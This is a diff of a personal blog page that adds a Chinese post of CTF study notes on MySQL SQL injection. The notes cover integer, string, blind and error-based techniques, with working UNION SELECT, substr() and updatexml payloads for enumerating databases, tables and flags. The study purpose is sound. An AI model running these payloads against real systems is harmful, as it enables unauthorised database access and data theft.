@@ -12,7 +12,7 @@
 
 
 
-<title>归档 | overnight-miss-you</title>
+<title>整，符，错。注入 | overnight-miss-you</title>
 
 
 
@@ -299,67 +299,200 @@
     }
 </script>
         <div class="main">
-            <div class="post-wrap archive">
+            <div class="container">
     
     
-        
-
-        
-            <h3>2020</h3>
-        
-
-        <article class="archive-item">
-            <a class="archive-item-link" href="/2020/10/10/8-9/">整，符，错。注入</a>
-            <span class="archive-item-date">October 10, 2020</span>
-        </article>
-    
-        
-
-        
-
-        <article class="archive-item">
-            <a class="archive-item-link" href="/2020/10/08/jinjie/">攻防世界进阶1-6</a>
-            <span class="archive-item-date">October 8, 2020</span>
-        </article>
-    
-        
-
-        
-
-        <article class="archive-item">
-            <a class="archive-item-link" href="/2020/10/07/himBHs-a/">攻防世界入门</a>
-            <span class="archive-item-date">October 7, 2020</span>
-        </article>
-    
-        
-
-        
-
-        <article class="archive-item">
-            <a class="archive-item-link" href="/2020/10/06/Characters%20of%20the%20filter/">字符过滤</a>
-            <span class="archive-item-date">October 6, 2020</span>
-        </article>
-    
-        
-
-        
-
-        <article class="archive-item">
-            <a class="archive-item-link" href="/2020/10/06/php-input/">三种伪协议</a>
-            <span class="archive-item-date">October 6, 2020</span>
-        </article>
-    
-        
-
-        
-
-        <article class="archive-item">
-            <a class="archive-item-link" href="/2020/10/03/wife/">亲爱的老婆们</a>
-            <span class="archive-item-date">October 3, 2020</span>
-        </article>
-    
-    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
 </div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">整，符，错。注入</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">﹎ゞ没有信任的爱情</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">October 10, 2020&nbsp;&nbsp;17:18:26</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="垃圾博客第六淡"><a href="#垃圾博客第六淡" class="headerlink" title="垃圾博客第六淡"></a>垃圾博客第六淡</h2><p>看着wp总结一下SQL注入的种种的判断方法和大概的解题方法。。</p>
+<h4 id="先简单的说一下SQL数据库"><a href="#先简单的说一下SQL数据库" class="headerlink" title="先简单的说一下SQL数据库"></a>先简单的说一下SQL数据库</h4><p>MySQL默认有“information_schema”的数据库，该库中有三个表名</p>
+<p>1、SCHEMATA：存储该用户创建的所有数据库的库名，记录库名的字段为SCHEMA_NAME。</p>
+<p> 2、TABLES：存储该用户创建的所有数据库的库名的字段（table_schema）和表名字段（table_name）。</p>
+<p> 3、COLUMNS：存储该用户创建的所有数据库的库名（table_schema）  表名（table_name）和字段名（columns_name）。</p>
+<h5 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h5><p>union操作符将两个SQL查询语句连接了起来，当设置id参数为-1时，由于没有id=-1的数据，因此会返回union后的查询语句的结果。</p>
+<p>通常的判断方法：</p>
+<p>输入<code>1</code>，执行成功。   输入<code>1 and 1=1</code>，执行成功。 输入<code>1 and 1=2</code>执行失败。 推断为整数型注入</p>
+<p>接着通过<code>1 order by 1</code>,<code>1 order by 2</code>,<code>1 order by 3</code>,来判断字段数。</p>
+<p>爆破数据库：<code>-1 union select 1,database()</code>   以<code>sqli</code>为例</p>
+<p>爆破sqli中的表名：<code>-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=flag</code> </p>
+<p>最后读取flag：<code>-1 union select 1 group_concat(flag)from sqli.flag</code></p>
+<h5 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h5><p>输入<code>1</code>，执行成功。   输入<code>1 and 1=1</code>，执行成功。 输入<code>1 and 1=2</code>执行成功。不是整数型注入 </p>
+<p>考虑是否为字符型注入执行<code>&#39;union select 1,database() -- &#39;</code>爆破出数据库sqli</p>
+<p>爆破其他的文件代码与上面的相似，不过在代码前加<code>&#39;</code>，在代码的最后加<code> --&#39;</code>。</p>
+<p>在没有回显的情况下可以使用抓包来爆破。</p>
+<p>爆破数据库名：<code>id=1&#39; and substr(database(),1,1)=&#39;a&#39;--+</code>,在<code>a</code>这里进行爆破第一个字母  后续一样</p>
+<p>爆破数据表名：<code>id=1&#39; and substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1)=&#39;a&#39;--+</code>,在<code>a</code>这里进行爆破第一个字母  后续一样，修改limit 0,1为limit 1,1，可以得到第二个表名，以此类推。</p>
+<h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><p>题如其名：当输入的代码出现错误时，程序直接将错误信息输出到页面上。</p>
+<p>爆破数据库：<code>1 union select updatexml(1,concat(0x7e,database(),0x7e),1);</code>,</p>
+<p>这句也行： <code>1 Union select count(*),concat(database(),0x26,floor(rand(0)*2))x from information_schema.columns group by x;</code></p>
+<p>爆破数据表明：<code>1 union select updatexml(1,concat(0x7e,  (select(group_concat(table_name))from information_schema.tables where  table_schema=&quot;sqli&quot;) ,0x7e),1);</code></p>
+<p>这句也行：<code>1 Union select count(*),concat((select table_name from information_schema.tables where table_schema=&#39;sqli&#39; limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x</code>不过这<code>limit 0,1)</code>要改为<code>limit 1,1)</code></p>
+<p>！！（0,1）表示输出第一个，（0，2）表示一次输出两个。</p>
+<p>贴心的贴贴：updatexml()函数</p>
+<p>UPDATEXML (XML_document, XPath_string, new_value);<br> 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br> 第二个参数：XPath_string (Xpath格式的字符串) 。<a target="_blank" rel="noopener" href="https://www.runoob.com/xpath/xpath-tutorial.html">细节的Xpath</a><br> 第三个参数：new_value，String格式，替换查找到的符合条件的数据<br> 作用：改变文档中符合条件的节点的值</p>
+<h4 id="！！！！这次的水博客就到这了，又加一位老婆，我得去吃牢房了！！！"><a href="#！！！！这次的水博客就到这了，又加一位老婆，我得去吃牢房了！！！" class="headerlink" title="！！！！这次的水博客就到这了，又加一位老婆，我得去吃牢房了！！！"></a>！！！！这次的水博客就到这了，又加一位老婆，我得去吃牢房了！！！</h4><p><img src="https://raw.githubusercontent.com/overnight-miss-you/test/master/111.jpg" alt="111"></p>
+<p><img src="https://raw.githubusercontent.com/overnight-miss-you/test/master/asdtimg.gif" alt="asdtimg"></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>﹎ゞ没有信任的爱情</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2020/10/10/8-9/">http://example.com/2020/10/10/8-9/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2020/10/08/jinjie/">攻防世界进阶1-6</a>
+            
+        </section>
+        
+            <section id="comments" class="comments">
+              <style>
+                .comments{margin:30px;padding:10px;background:#ddd}
+                @media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#ddd}}
+              </style>
+              <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+      el: '.valine_comment',
+      app_id: 'AGC51zjjy9ICRLH7k5Xt42Pm-gzGzoHsz',
+      app_key: 'Pf5AC03FDS29xbJPgiAgM0Fi',
+      placeholder: '请在此输入您的留言',
+      notify: 'false',
+      verify: 'false',
+    });
+</script>
+            </section>
+        
+
+    </article>
+</div>
+
         </div>
         <footer id="footer" class="footer">
     <div class="copyright">
